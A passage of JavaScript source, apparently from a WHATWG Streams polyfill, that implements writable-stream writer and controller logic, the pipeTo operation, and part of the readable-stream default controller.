        assertWritableStream(stream, 'First parameter');
        if (IsWritableStreamLocked(stream)) {
            throw new TypeError('This stream has already been locked for exclusive writing by another writer');
        }
        this._ownerWritableStream = stream;
        stream._writer = this;
        const state = stream._state;
        if (state === 'writable') {
            if (!WritableStreamCloseQueuedOrInFlight(stream) && stream._backpressure) {
                defaultWriterReadyPromiseInitialize(this);
            }
            else {
                defaultWriterReadyPromiseInitializeAsResolved(this);
            }
            defaultWriterClosedPromiseInitialize(this);
        }
        else if (state === 'erroring') {
            defaultWriterReadyPromiseInitializeAsRejected(this, stream._storedError);
            defaultWriterClosedPromiseInitialize(this);
        }
        else if (state === 'closed') {
            defaultWriterReadyPromiseInitializeAsResolved(this);
            defaultWriterClosedPromiseInitializeAsResolved(this);
        }
        else {
            const storedError = stream._storedError;
            defaultWriterReadyPromiseInitializeAsRejected(this, storedError);
            defaultWriterClosedPromiseInitializeAsRejected(this, storedError);
        }
    }
    /**
     * Returns a promise that will be fulfilled when the stream becomes closed, or rejected if the stream ever errors or
     * the writer’s lock is released before the stream finishes closing.
     */
    get closed() {
        if (!IsWritableStreamDefaultWriter(this)) {
            return promiseRejectedWith(defaultWriterBrandCheckException('closed'));
        }
        return this._closedPromise;
    }
    /**
     * Returns the desired size to fill the stream’s internal queue. It can be negative, if the queue is over-full.
     * A producer can use this information to determine the right amount of data to write.
     *
     * It will be `null` if the stream cannot be successfully written to (due to either being errored, or having an abort
     * queued up). It will return zero if the stream is closed. And the getter will throw an exception if invoked when
     * the writer’s lock is released.
     */
    get desiredSize() {
        if (!IsWritableStreamDefaultWriter(this)) {
            throw defaultWriterBrandCheckException('desiredSize');
        }
        if (this._ownerWritableStream === undefined) {
            throw defaultWriterLockException('desiredSize');
        }
        return WritableStreamDefaultWriterGetDesiredSize(this);
    }
    /**
     * Returns a promise that will be fulfilled when the desired size to fill the stream’s internal queue transitions
     * from non-positive to positive, signaling that it is no longer applying backpressure. Once the desired size dips
     * back to zero or below, the getter will return a new promise that stays pending until the next transition.
     *
     * If the stream becomes errored or aborted, or the writer’s lock is released, the returned promise will become
     * rejected.
     */
    get ready() {
        if (!IsWritableStreamDefaultWriter(this)) {
            return promiseRejectedWith(defaultWriterBrandCheckException('ready'));
        }
        return this._readyPromise;
    }
    /**
     * If the reader is active, behaves the same as {@link WritableStream.abort | stream.abort(reason)}.
     */
    abort(reason = undefined) {
        if (!IsWritableStreamDefaultWriter(this)) {
            return promiseRejectedWith(defaultWriterBrandCheckException('abort'));
        }
        if (this._ownerWritableStream === undefined) {
            return promiseRejectedWith(defaultWriterLockException('abort'));
        }
        return WritableStreamDefaultWriterAbort(this, reason);
    }
    /**
     * If the reader is active, behaves the same as {@link WritableStream.close | stream.close()}.
     */
    close() {
        if (!IsWritableStreamDefaultWriter(this)) {
            return promiseRejectedWith(defaultWriterBrandCheckException('close'));
        }
        const stream = this._ownerWritableStream;
        if (stream === undefined) {
            return promiseRejectedWith(defaultWriterLockException('close'));
        }
        if (WritableStreamCloseQueuedOrInFlight(stream)) {
            return promiseRejectedWith(new TypeError('Cannot close an already-closing stream'));
        }
        return WritableStreamDefaultWriterClose(this);
    }
    /**
     * Releases the writer’s lock on the corresponding stream. After the lock is released, the writer is no longer active.
     * If the associated stream is errored when the lock is released, the writer will appear errored in the same way from
     * now on; otherwise, the writer will appear closed.
     *
     * Note that the lock can still be released even if some ongoing writes have not yet finished (i.e. even if the
     * promises returned from previous calls to {@link WritableStreamDefaultWriter.write | write()} have not yet settled).
     * It’s not necessary to hold the lock on the writer for the duration of the write; the lock instead simply prevents
     * other producers from writing in an interleaved manner.
     */
    releaseLock() {
        if (!IsWritableStreamDefaultWriter(this)) {
            throw defaultWriterBrandCheckException('releaseLock');
        }
        const stream = this._ownerWritableStream;
        if (stream === undefined) {
            return;
        }
        WritableStreamDefaultWriterRelease(this);
    }
    write(chunk = undefined) {
        if (!IsWritableStreamDefaultWriter(this)) {
            return promiseRejectedWith(defaultWriterBrandCheckException('write'));
        }
        if (this._ownerWritableStream === undefined) {
            return promiseRejectedWith(defaultWriterLockException('write to'));
        }
        return WritableStreamDefaultWriterWrite(this, chunk);
    }
}
Object.defineProperties(WritableStreamDefaultWriter.prototype, {
    abort: { enumerable: true },
    close: { enumerable: true },
    releaseLock: { enumerable: true },
    write: { enumerable: true },
    closed: { enumerable: true },
    desiredSize: { enumerable: true },
    ready: { enumerable: true }
});
// Abstract operations for the WritableStreamDefaultWriter.
function IsWritableStreamDefaultWriter(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_ownerWritableStream')) {
        return false;
    }
    return x instanceof WritableStreamDefaultWriter;
}
// A client of WritableStreamDefaultWriter may use these functions directly to bypass state check.
function WritableStreamDefaultWriterAbort(writer, reason) {
    const stream = writer._ownerWritableStream;
    return WritableStreamAbort(stream, reason);
}
function WritableStreamDefaultWriterClose(writer) {
    const stream = writer._ownerWritableStream;
    return WritableStreamClose(stream);
}
function WritableStreamDefaultWriterCloseWithErrorPropagation(writer) {
    const stream = writer._ownerWritableStream;
    const state = stream._state;
    if (WritableStreamCloseQueuedOrInFlight(stream) || state === 'closed') {
        return promiseResolvedWith(undefined);
    }
    if (state === 'errored') {
        return promiseRejectedWith(stream._storedError);
    }
    return WritableStreamDefaultWriterClose(writer);
}
function WritableStreamDefaultWriterEnsureClosedPromiseRejected(writer, error) {
    if (writer._closedPromiseState === 'pending') {
        defaultWriterClosedPromiseReject(writer, error);
    }
    else {
        defaultWriterClosedPromiseResetToRejected(writer, error);
    }
}
function WritableStreamDefaultWriterEnsureReadyPromiseRejected(writer, error) {
    if (writer._readyPromiseState === 'pending') {
        defaultWriterReadyPromiseReject(writer, error);
    }
    else {
        defaultWriterReadyPromiseResetToRejected(writer, error);
    }
}
function WritableStreamDefaultWriterGetDesiredSize(writer) {
    const stream = writer._ownerWritableStream;
    const state = stream._state;
    if (state === 'errored' || state === 'erroring') {
        return null;
    }
    if (state === 'closed') {
        return 0;
    }
    return WritableStreamDefaultControllerGetDesiredSize(stream._writableStreamController);
}
function WritableStreamDefaultWriterRelease(writer) {
    const stream = writer._ownerWritableStream;
    const releasedError = new TypeError(`Writer was released and can no longer be used to monitor the stream's closedness`);
    WritableStreamDefaultWriterEnsureReadyPromiseRejected(writer, releasedError);
    // The state transitions to "errored" before the sink abort() method runs, but the writer.closed promise is not
    // rejected until afterwards. This means that simply testing state will not work.
    WritableStreamDefaultWriterEnsureClosedPromiseRejected(writer, releasedError);
    stream._writer = undefined;
    writer._ownerWritableStream = undefined;
}
function WritableStreamDefaultWriterWrite(writer, chunk) {
    const stream = writer._ownerWritableStream;
    const controller = stream._writableStreamController;
    const chunkSize = WritableStreamDefaultControllerGetChunkSize(controller, chunk);
    if (stream !== writer._ownerWritableStream) {
        return promiseRejectedWith(defaultWriterLockException('write to'));
    }
    const state = stream._state;
    if (state === 'errored') {
        return promiseRejectedWith(stream._storedError);
    }
    if (WritableStreamCloseQueuedOrInFlight(stream) || state === 'closed') {
        return promiseRejectedWith(new TypeError('The stream is closing or closed and cannot be written to'));
    }
    if (state === 'erroring') {
        return promiseRejectedWith(stream._storedError);
    }
    const promise = WritableStreamAddWriteRequest(stream);
    WritableStreamDefaultControllerWrite(controller, chunk, chunkSize);
    return promise;
}
const closeSentinel = {};
/**
 * Allows control of a {@link WritableStream | writable stream}'s state and internal queue.
 *
 * @public
 */
class WritableStreamDefaultController {
    constructor() {
        throw new TypeError('Illegal constructor');
    }
    /**
     * The reason which was passed to `WritableStream.abort(reason)` when the stream was aborted.
     *
     * @deprecated
     *  This property has been removed from the specification, see https://github.com/whatwg/streams/pull/1177.
     *  Use {@link WritableStreamDefaultController.signal}'s `reason` instead.
     */
    get abortReason() {
        if (!IsWritableStreamDefaultController(this)) {
            throw defaultControllerBrandCheckException$2('abortReason');
        }
        return this._abortReason;
    }
    /**
     * An `AbortSignal` that can be used to abort the pending write or close operation when the stream is aborted.
     */
    get signal() {
        if (!IsWritableStreamDefaultController(this)) {
            throw defaultControllerBrandCheckException$2('signal');
        }
        if (this._abortController === undefined) {
            // Older browsers or older Node versions may not support `AbortController` or `AbortSignal`.
            // We don't want to bundle and ship an `AbortController` polyfill together with our polyfill,
            // so instead we only implement support for `signal` if we find a global `AbortController` constructor.
            throw new TypeError('WritableStreamDefaultController.prototype.signal is not supported');
        }
        return this._abortController.signal;
    }
    /**
     * Closes the controlled writable stream, making all future interactions with it fail with the given error `e`.
     *
     * This method is rarely used, since usually it suffices to return a rejected promise from one of the underlying
     * sink's methods. However, it can be useful for suddenly shutting down a stream in response to an event outside the
     * normal lifecycle of interactions with the underlying sink.
     */
    error(e = undefined) {
        if (!IsWritableStreamDefaultController(this)) {
            throw defaultControllerBrandCheckException$2('error');
        }
        const state = this._controlledWritableStream._state;
        if (state !== 'writable') {
            // The stream is closed, errored or will be soon. The sink can't do anything useful if it gets an error here, so
            // just treat it as a no-op.
            return;
        }
        WritableStreamDefaultControllerError(this, e);
    }
    /** @internal */
    [AbortSteps](reason) {
        const result = this._abortAlgorithm(reason);
        WritableStreamDefaultControllerClearAlgorithms(this);
        return result;
    }
    /** @internal */
    [ErrorSteps]() {
        ResetQueue(this);
    }
}
Object.defineProperties(WritableStreamDefaultController.prototype, {
    abortReason: { enumerable: true },
    signal: { enumerable: true },
    error: { enumerable: true }
});
// Abstract operations implementing interface required by the WritableStream.
function IsWritableStreamDefaultController(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_controlledWritableStream')) {
        return false;
    }
    return x instanceof WritableStreamDefaultController;
}
function SetUpWritableStreamDefaultController(stream, controller, startAlgorithm, writeAlgorithm, closeAlgorithm, abortAlgorithm, highWaterMark, sizeAlgorithm) {
    controller._controlledWritableStream = stream;
    stream._writableStreamController = controller;
    // Need to set the slots so that the assert doesn't fire. In the spec the slots already exist implicitly.
    controller._queue = undefined;
    controller._queueTotalSize = undefined;
    ResetQueue(controller);
    controller._abortReason = undefined;
    controller._abortController = new AbortController();
    controller._started = false;
    controller._strategySizeAlgorithm = sizeAlgorithm;
    controller._strategyHWM = highWaterMark;
    controller._writeAlgorithm = writeAlgorithm;
    controller._closeAlgorithm = closeAlgorithm;
    controller._abortAlgorithm = abortAlgorithm;
    const backpressure = WritableStreamDefaultControllerGetBackpressure(controller);
    WritableStreamUpdateBackpressure(stream, backpressure);
    const startResult = startAlgorithm();
    const startPromise = promiseResolvedWith(startResult);
    uponPromise(startPromise, () => {
        controller._started = true;
        WritableStreamDefaultControllerAdvanceQueueIfNeeded(controller);
    }, r => {
        controller._started = true;
        WritableStreamDealWithRejection(stream, r);
    });
}
function SetUpWritableStreamDefaultControllerFromUnderlyingSink(stream, underlyingSink, highWaterMark, sizeAlgorithm) {
    const controller = Object.create(WritableStreamDefaultController.prototype);
    let startAlgorithm = () => undefined;
    let writeAlgorithm = () => promiseResolvedWith(undefined);
    let closeAlgorithm = () => promiseResolvedWith(undefined);
    let abortAlgorithm = () => promiseResolvedWith(undefined);
    if (underlyingSink.start !== undefined) {
        startAlgorithm = () => underlyingSink.start(controller);
    }
    if (underlyingSink.write !== undefined) {
        writeAlgorithm = chunk => underlyingSink.write(chunk, controller);
    }
    if (underlyingSink.close !== undefined) {
        closeAlgorithm = () => underlyingSink.close();
    }
    if (underlyingSink.abort !== undefined) {
        abortAlgorithm = reason => underlyingSink.abort(reason);
    }
    SetUpWritableStreamDefaultController(stream, controller, startAlgorithm, writeAlgorithm, closeAlgorithm, abortAlgorithm, highWaterMark, sizeAlgorithm);
}
// ClearAlgorithms may be called twice. Erroring the same stream in multiple ways will often result in redundant calls.
function WritableStreamDefaultControllerClearAlgorithms(controller) {
    controller._writeAlgorithm = undefined;
    controller._closeAlgorithm = undefined;
    controller._abortAlgorithm = undefined;
    controller._strategySizeAlgorithm = undefined;
}
function WritableStreamDefaultControllerClose(controller) {
    EnqueueValueWithSize(controller, closeSentinel, 0);
    WritableStreamDefaultControllerAdvanceQueueIfNeeded(controller);
}
function WritableStreamDefaultControllerGetChunkSize(controller, chunk) {
    try {
        return controller._strategySizeAlgorithm(chunk);
    }
    catch (chunkSizeE) {
        WritableStreamDefaultControllerErrorIfNeeded(controller, chunkSizeE);
        return 1;
    }
}
function WritableStreamDefaultControllerGetDesiredSize(controller) {
    return controller._strategyHWM - controller._queueTotalSize;
}
function WritableStreamDefaultControllerWrite(controller, chunk, chunkSize) {
    try {
        EnqueueValueWithSize(controller, chunk, chunkSize);
    }
    catch (enqueueE) {
        WritableStreamDefaultControllerErrorIfNeeded(controller, enqueueE);
        return;
    }
    const stream = controller._controlledWritableStream;
    if (!WritableStreamCloseQueuedOrInFlight(stream) && stream._state === 'writable') {
        const backpressure = WritableStreamDefaultControllerGetBackpressure(controller);
        WritableStreamUpdateBackpressure(stream, backpressure);
    }
    WritableStreamDefaultControllerAdvanceQueueIfNeeded(controller);
}
// Abstract operations for the WritableStreamDefaultController.
function WritableStreamDefaultControllerAdvanceQueueIfNeeded(controller) {
    const stream = controller._controlledWritableStream;
    if (!controller._started) {
        return;
    }
    if (stream._inFlightWriteRequest !== undefined) {
        return;
    }
    const state = stream._state;
    if (state === 'erroring') {
        WritableStreamFinishErroring(stream);
        return;
    }
    if (controller._queue.length === 0) {
        return;
    }
    const value = PeekQueueValue(controller);
    if (value === closeSentinel) {
        WritableStreamDefaultControllerProcessClose(controller);
    }
    else {
        WritableStreamDefaultControllerProcessWrite(controller, value);
    }
}
function WritableStreamDefaultControllerErrorIfNeeded(controller, error) {
    if (controller._controlledWritableStream._state === 'writable') {
        WritableStreamDefaultControllerError(controller, error);
    }
}
function WritableStreamDefaultControllerProcessClose(controller) {
    const stream = controller._controlledWritableStream;
    WritableStreamMarkCloseRequestInFlight(stream);
    DequeueValue(controller);
    const sinkClosePromise = controller._closeAlgorithm();
    WritableStreamDefaultControllerClearAlgorithms(controller);
    uponPromise(sinkClosePromise, () => {
        WritableStreamFinishInFlightClose(stream);
    }, reason => {
        WritableStreamFinishInFlightCloseWithError(stream, reason);
    });
}
function WritableStreamDefaultControllerProcessWrite(controller, chunk) {
    const stream = controller._controlledWritableStream;
    WritableStreamMarkFirstWriteRequestInFlight(stream);
    const sinkWritePromise = controller._writeAlgorithm(chunk);
    uponPromise(sinkWritePromise, () => {
        WritableStreamFinishInFlightWrite(stream);
        const state = stream._state;
        DequeueValue(controller);
        if (!WritableStreamCloseQueuedOrInFlight(stream) && state === 'writable') {
            const backpressure = WritableStreamDefaultControllerGetBackpressure(controller);
            WritableStreamUpdateBackpressure(stream, backpressure);
        }
        WritableStreamDefaultControllerAdvanceQueueIfNeeded(controller);
    }, reason => {
        if (stream._state === 'writable') {
            WritableStreamDefaultControllerClearAlgorithms(controller);
        }
        WritableStreamFinishInFlightWriteWithError(stream, reason);
    });
}
function WritableStreamDefaultControllerGetBackpressure(controller) {
    const desiredSize = WritableStreamDefaultControllerGetDesiredSize(controller);
    return desiredSize <= 0;
}
// A client of WritableStreamDefaultController may use these functions directly to bypass state check.
function WritableStreamDefaultControllerError(controller, error) {
    const stream = controller._controlledWritableStream;
    WritableStreamDefaultControllerClearAlgorithms(controller);
    WritableStreamStartErroring(stream, error);
}
// Helper functions for the WritableStream.
function streamBrandCheckException$2(name) {
    return new TypeError(`WritableStream.prototype.${name} can only be used on a WritableStream`);
}
// Helper functions for the WritableStreamDefaultController.
function defaultControllerBrandCheckException$2(name) {
    return new TypeError(`WritableStreamDefaultController.prototype.${name} can only be used on a WritableStreamDefaultController`);
}
// Helper functions for the WritableStreamDefaultWriter.
function defaultWriterBrandCheckException(name) {
    return new TypeError(`WritableStreamDefaultWriter.prototype.${name} can only be used on a WritableStreamDefaultWriter`);
}
function defaultWriterLockException(name) {
    return new TypeError('Cannot ' + name + ' a stream using a released writer');
}
function defaultWriterClosedPromiseInitialize(writer) {
    writer._closedPromise = newPromise((resolve, reject) => {
        writer._closedPromise_resolve = resolve;
        writer._closedPromise_reject = reject;
        writer._closedPromiseState = 'pending';
    });
}
function defaultWriterClosedPromiseInitializeAsRejected(writer, reason) {
    defaultWriterClosedPromiseInitialize(writer);
    defaultWriterClosedPromiseReject(writer, reason);
}
function defaultWriterClosedPromiseInitializeAsResolved(writer) {
    defaultWriterClosedPromiseInitialize(writer);
    defaultWriterClosedPromiseResolve(writer);
}
function defaultWriterClosedPromiseReject(writer, reason) {
    if (writer._closedPromise_reject === undefined) {
        return;
    }
    setPromiseIsHandledToTrue(writer._closedPromise);
    writer._closedPromise_reject(reason);
    writer._closedPromise_resolve = undefined;
    writer._closedPromise_reject = undefined;
    writer._closedPromiseState = 'rejected';
}
function defaultWriterClosedPromiseResetToRejected(writer, reason) {
    defaultWriterClosedPromiseInitializeAsRejected(writer, reason);
}
function defaultWriterClosedPromiseResolve(writer) {
    if (writer._closedPromise_resolve === undefined) {
        return;
    }
    writer._closedPromise_resolve(undefined);
    writer._closedPromise_resolve = undefined;
    writer._closedPromise_reject = undefined;
    writer._closedPromiseState = 'resolved';
}
function defaultWriterReadyPromiseInitialize(writer) {
    writer._readyPromise = newPromise((resolve, reject) => {
        writer._readyPromise_resolve = resolve;
        writer._readyPromise_reject = reject;
    });
    writer._readyPromiseState = 'pending';
}
function defaultWriterReadyPromiseInitializeAsRejected(writer, reason) {
    defaultWriterReadyPromiseInitialize(writer);
    defaultWriterReadyPromiseReject(writer, reason);
}
function defaultWriterReadyPromiseInitializeAsResolved(writer) {
    defaultWriterReadyPromiseInitialize(writer);
    defaultWriterReadyPromiseResolve(writer);
}
function defaultWriterReadyPromiseReject(writer, reason) {
    if (writer._readyPromise_reject === undefined) {
        return;
    }
    setPromiseIsHandledToTrue(writer._readyPromise);
    writer._readyPromise_reject(reason);
    writer._readyPromise_resolve = undefined;
    writer._readyPromise_reject = undefined;
    writer._readyPromiseState = 'rejected';
}
function defaultWriterReadyPromiseReset(writer) {
    defaultWriterReadyPromiseInitialize(writer);
}
function defaultWriterReadyPromiseResetToRejected(writer, reason) {
    defaultWriterReadyPromiseInitializeAsRejected(writer, reason);
}
function defaultWriterReadyPromiseResolve(writer) {
    if (writer._readyPromise_resolve === undefined) {
        return;
    }
    writer._readyPromise_resolve(undefined);
    writer._readyPromise_resolve = undefined;
    writer._readyPromise_reject = undefined;
    writer._readyPromiseState = 'fulfilled';
}
// eslint-disable-next-line no-redeclarelet DOMException$1=DOMException

function ReadableStreamPipeTo(source, dest, preventClose, preventAbort, preventCancel, signal) {
    const reader = AcquireReadableStreamDefaultReader(source);
    const writer = AcquireWritableStreamDefaultWriter(dest);
    source._disturbed = true;
    let shuttingDown = false;
    // This is used to keep track of the spec's requirement that we wait for ongoing writes during shutdown.
    let currentWrite = promiseResolvedWith(undefined);
    return newPromise((resolve, reject) => {
        let abortAlgorithm;
        if (signal !== undefined) {
            abortAlgorithm = () => {
                const error =new DOMException('Aborted', 'AbortError');
                const actions = [];
                if (!preventAbort) {
                    actions.push(() => {
                        if (dest._state === 'writable') {
                            return WritableStreamAbort(dest, error);
                        }
                        return promiseResolvedWith(undefined);
                    });
                }
                if (!preventCancel) {
                    actions.push(() => {
                        if (source._state === 'readable') {
                            return ReadableStreamCancel(source, error);
                        }
                        return promiseResolvedWith(undefined);
                    });
                }
                shutdownWithAction(() => Promise.all(actions.map(action => action())), true, error);
            };
            if (signal.aborted) {
                abortAlgorithm();
                return;
            }
            signal.addEventListener('abort', abortAlgorithm);
        }
        // Using reader and writer, read all chunks from this and write them to dest
        // - Backpressure must be enforced
        // - Shutdown must stop all activity
        function pipeLoop() {
            return newPromise((resolveLoop, rejectLoop) => {
                function next(done) {
                    if (done) {
                        resolveLoop();
                    }
                    else {
                        // Use `PerformPromiseThen` instead of `uponPromise` to avoid
                        // adding unnecessary `.catch(rethrowAssertionErrorRejection)` handlers
                        PerformPromiseThen(pipeStep(), next, rejectLoop);
                    }
                }
                next(false);
            });
        }
        function pipeStep() {
            if (shuttingDown) {
                return promiseResolvedWith(true);
            }
            return PerformPromiseThen(writer._readyPromise, () => {
                return newPromise((resolveRead, rejectRead) => {
                    ReadableStreamDefaultReaderRead(reader, {
                        _chunkSteps: chunk => {
                            currentWrite = PerformPromiseThen(WritableStreamDefaultWriterWrite(writer, chunk), undefined, noop);
                            resolveRead(false);
                        },
                        _closeSteps: () => resolveRead(true),
                        _errorSteps: rejectRead
                    });
                });
            });
        }
        // Errors must be propagated forward
        isOrBecomesErrored(source, reader._closedPromise, storedError => {
            if (!preventAbort) {
                shutdownWithAction(() => WritableStreamAbort(dest, storedError), true, storedError);
            }
            else {
                shutdown(true, storedError);
            }
        });
        // Errors must be propagated backward
        isOrBecomesErrored(dest, writer._closedPromise, storedError => {
            if (!preventCancel) {
                shutdownWithAction(() => ReadableStreamCancel(source, storedError), true, storedError);
            }
            else {
                shutdown(true, storedError);
            }
        });
        // Closing must be propagated forward
        isOrBecomesClosed(source, reader._closedPromise, () => {
            if (!preventClose) {
                shutdownWithAction(() => WritableStreamDefaultWriterCloseWithErrorPropagation(writer));
            }
            else {
                shutdown();
            }
        });
        // Closing must be propagated backward
        if (WritableStreamCloseQueuedOrInFlight(dest) || dest._state === 'closed') {
            const destClosed = new TypeError('the destination writable stream closed before all data could be piped to it');
            if (!preventCancel) {
                shutdownWithAction(() => ReadableStreamCancel(source, destClosed), true, destClosed);
            }
            else {
                shutdown(true, destClosed);
            }
        }
        setPromiseIsHandledToTrue(pipeLoop());
        function waitForWritesToFinish() {
            // Another write may have started while we were waiting on this currentWrite, so we have to be sure to wait
            // for that too.
            const oldCurrentWrite = currentWrite;
            return PerformPromiseThen(currentWrite, () => oldCurrentWrite !== currentWrite ? waitForWritesToFinish() : undefined);
        }
        function isOrBecomesErrored(stream, promise, action) {
            if (stream._state === 'errored') {
                action(stream._storedError);
            }
            else {
                uponRejection(promise, action);
            }
        }
        function isOrBecomesClosed(stream, promise, action) {
            if (stream._state === 'closed') {
                action();
            }
            else {
                uponFulfillment(promise, action);
            }
        }
        function shutdownWithAction(action, originalIsError, originalError) {
            if (shuttingDown) {
                return;
            }
            shuttingDown = true;
            if (dest._state === 'writable' && !WritableStreamCloseQueuedOrInFlight(dest)) {
                uponFulfillment(waitForWritesToFinish(), doTheRest);
            }
            else {
                doTheRest();
            }
            function doTheRest() {
                uponPromise(action(), () => finalize(originalIsError, originalError), newError => finalize(true, newError));
            }
        }
        function shutdown(isError, error) {
            if (shuttingDown) {
                return;
            }
            shuttingDown = true;
            if (dest._state === 'writable' && !WritableStreamCloseQueuedOrInFlight(dest)) {
                uponFulfillment(waitForWritesToFinish(), () => finalize(isError, error));
            }
            else {
                finalize(isError, error);
            }
        }
        function finalize(isError, error) {
            WritableStreamDefaultWriterRelease(writer);
            ReadableStreamReaderGenericRelease(reader);
            if (signal !== undefined) {
                signal.removeEventListener('abort', abortAlgorithm);
            }
            if (isError) {
                reject(error);
            }
            else {
                resolve(undefined);
            }
        }
    });
}

/**
 * Allows control of a {@link ReadableStream | readable stream}'s state and internal queue.
 *
 * @public
 */
class ReadableStreamDefaultController {
    constructor() {
        throw new TypeError('Illegal constructor');
    }
    /**
     * Returns the desired size to fill the controlled stream's internal queue. It can be negative, if the queue is
     * over-full. An underlying source ought to use this information to determine when and how to apply backpressure.
     */
    get desiredSize() {
        if (!IsReadableStreamDefaultController(this)) {
            throw defaultControllerBrandCheckException$1('desiredSize');
        }
        return ReadableStreamDefaultControllerGetDesiredSize(this);
    }
    /**
     * Closes the controlled readable stream. Consumers will still be able to read any previously-enqueued chunks from
     * the stream, but once those are read, the stream will become closed.
     */
    close() {
        if (!IsReadableStreamDefaultController(this)) {
            throw defaultControllerBrandCheckException$1('close');
        }
        if (!ReadableStreamDefaultControllerCanCloseOrEnqueue(this)) {
            throw new TypeError('The stream is not in a state that permits close');
        }
        ReadableStreamDefaultControllerClose(this);
    }
    enqueue(chunk = undefined) {
        if (!IsReadableStreamDefaultController(this)) {
            throw defaultControllerBrandCheckException$1('enqueue');
        }
        if (!ReadableStreamDefaultControllerCanCloseOrEnqueue(this)) {
            throw new TypeError('The stream is not in a state that permits enqueue');
        }
        return ReadableStreamDefaultControllerEnqueue(this, chunk);
    }
    /**
     * Errors the controlled readable stream, making all future interactions with it fail with the given error `e`.
     */
    error(e = undefined) {
        if (!IsReadableStreamDefaultController(this)) {
            throw defaultControllerBrandCheckException$1('error');
        }
        ReadableStreamDefaultControllerError(this, e);
    }
    /** @internal */
    [CancelSteps](reason) {
        ResetQueue(this);
        const result = this._cancelAlgorithm(reason);
        ReadableStreamDefaultControllerClearAlgorithms(this);
        return result;
    }
    /** @internal */
    [PullSteps](readRequest) {
        const stream = this._controlledReadableStream;
        if (this._queue.length > 0) {
            const chunk = DequeueValue(this);
            if (this._closeRequested && this._queue.length === 0) {
                ReadableStreamDefaultControllerClearAlgorithms(this);
                ReadableStreamClose(stream);
            }
            else {
                ReadableStreamDefaultControllerCallPullIfNeeded(this);
            }
            readRequest._chunkSteps(chunk);
        }
        else {
            ReadableStreamAddReadRequest(stream, readRequest);
            ReadableStreamDefaultControllerCallPullIfNeeded(this);
        }
    }
}
Object.defineProperties(ReadableStreamDefaultController.prototype, {
    close: { enumerable: true },
    enqueue: { enumerable: true },
    error: { enumerable: true },
    desiredSize: { enumerable: true }
});
// Abstract operations for the ReadableStreamDefaultController.
function IsReadableStreamDefaultController(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_controlledReadableStream')) {
        return false;
    }
    return x instanceof ReadableStreamDefaultController;
}
function ReadableStreamDefaultControllerCallPullIfNeeded(controller) {
    const shouldPull = ReadableStreamDefaultControllerShouldCallPull(controller);
    if (!shouldPull) {
        return;
    }
    if (controller._pulling) {
        controller._pullAgain = true;
        return;
    }
    controller._pulling = true;
    const pullPromise = controller._pullAlgorithm();
    uponPromise(pullPromise, () => {
        controller._pulling = false;
        if (controller._pullAgain) {
            controller._pullAgain = false;
            ReadableStreamDefaultControllerCallPullIfNeeded(controller);
        }
    }, e => {
        ReadableStreamDefaultControllerError(controller, e);
    });
}
function ReadableStreamDefaultControllerShouldCallPull(controller) {
    const stream = controller._controlledReadableStream;
    if (!ReadableStreamDefaultControllerCanCloseOrEnqueue(controller)) {
        return false;
    }
    if (!controller._started) {
        return false;
    }
    if (IsReadableStreamLocked(stream) && ReadableStreamGetNumReadRequests(stream) > 0) {
        return true;
    }
    const desiredSize = ReadableStreamDefaultControllerGetDesiredSize(controller);
    if (desiredSize > 0) {
        return true;
    }
    return false;
}
function ReadableStreamDefaultControllerClearAlgorithms(controller) {
    controller._pullAlgorithm = undefined;
    controller._cancelAlgorithm = undefined;
    controller._strategySizeAlgorithm = undefined;
}
// A client of ReadableStreamDefaultController may use these functions directly to bypass state check.
function ReadableStreamDefaultControllerClose(controller) {
    if (!ReadableStreamDefaultControllerCanCloseOrEnqueue(controller)) {
        return;
    }
    const stream = controller._controlledReadableStream;
    controller._closeRequested = true;
    if (controller._queue.length === 0) {
        ReadableStreamDefaultControllerClearAlgorithms(controller);
        ReadableStreamClose(stream);
    }
}
function ReadableStreamDefaultControllerEnqueue(controller, chunk) {
    if (!ReadableStreamDefaultControllerCanCloseOrEnqueue(controller)) {
        return;
    }
    const stream = controller._controlledReadableStream;
    if (IsReadableStreamLocked(stream) && ReadableStreamGetNumReadRequests(stream) > 0) {
        ReadableStreamFulfillReadRequest(stream, chunk, false);
    }
    else {
        let chunkSize;
        try {
            chunkSize = controller._strategySizeAlgorithm(chunk);
        }
        catch (chunkSizeE) {
            ReadableStreamDefaultControllerError(controller, chunkSizeE);
            throw chunkSizeE;
        }
        try {
            EnqueueValueWithSize(controller, chunk, chunkSize);
        }
        catch (enqueueE) {
            ReadableStreamDefaultControllerError(controller, enqueueE);
            throw enqueueE;
        }
    }
    ReadableStreamDefaultControllerCallPullIfNeeded(controller);
}
function ReadableStreamDefaultControllerError(controller, e) {
    const stream = controller._controlledReadableStream;
    if (stream._state !== 'readable') {
        return;
    }
    ResetQueue(controller);
    ReadableStreamDefaultControllerClearAlgorithms(controller);
    ReadableStreamError(stream, e);
}
function ReadableStreamDefaultControllerGetDesiredSize(controller) {
    const state = controller._controlledReadableStream._state;
    if (state === 'errored') {
        return null;
    }
    if (state === 'closed') {
        return 0;
    }
    return controller._strategyHWM - controller._queueTotalSize;
}
// This is used in the implementation of TransformStream.
function ReadableStreamDefaultControllerHasBackpressure(controller) {
    if (ReadableStreamDefaultControllerShouldCallPull(controller)) {
        return false;
    }
    return true;
}
function ReadableStreamDefaultControllerCanCloseOrEnqueue(controller) {
    const state = controller._controlledReadableStream._state;
    if (!controller._closeRequested && state === 'readable') {
        return true;
    }
    return false;
}
function SetUpReadableStreamDefaultController(stream, controller, startAlgorithm, pullAlgorithm, cancelAlgorithm, highWaterMark, sizeAlgorithm) {
    controller._controlledReadableStream = stream;
    controller._queue = undefined;
    controller._queueTotalSize = undefined;
    ResetQueue(controller);
    controller._started = false;
    controller._closeRequested = false;
    controller._pullAgain = false;
    controller._pulling = false;
    controller._strategySizeAlgorithm = sizeAlgorithm;
    controller._strategyHWM = highWaterMark;
    controller._pullAlgorithm = pullAlgorithm;
    controller._cancelAlgorithm = cancelAlgorithm;
    stream._readableStreamController = controller;
    const startResult = startAlgorithm();
    uponPromise(promiseResolvedWith(startResult), () => {
        controller._started = true;
        ReadableStreamDefaultControllerCallPullIfNeeded(controller);
    }, r => {
        ReadableStreamDefaultControllerError(controller, r);
    });
}
function SetUpReadableStreamDefaultControllerFromUnderlyingSource(stream, underlyingSource, highWaterMark, sizeAlgorithm) {
    const controller = Object.create(ReadableStreamDefaultController.prototype);
